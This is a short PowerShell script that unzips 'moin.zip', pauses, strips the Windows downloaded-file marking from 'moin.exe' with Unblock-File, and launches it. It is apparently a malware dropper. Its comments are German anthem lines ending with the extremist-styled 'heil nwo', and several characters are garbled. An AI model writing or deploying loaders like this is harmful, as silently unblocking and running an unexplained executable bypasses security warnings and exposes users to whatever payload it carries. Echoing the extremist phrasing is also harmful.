# Einigkeit und Recht und Freiheit
$zipPath = Join-Path -Path $PSScriptRoot -ChildPath "moin.zip"

# f�r das deutsche Vaterland
$destinationPath = $PSScriptRoot

# Danach lasst uns alle streben
$exePath = Join-Path -Path $destinationPath -ChildPath "moin.exe"

# br�derlich mit Herz und Hand
Expand-Archive -Path $zipPath -DestinationPath $destinationPath

# Einigkeit und Recht und Freiheit
Start-Sleep -Seconds 15

# sind des Gl�ckes Unterpfand
Unblock-File -Path $exePath

# heil nwo
Start-Process -FilePath $exePath
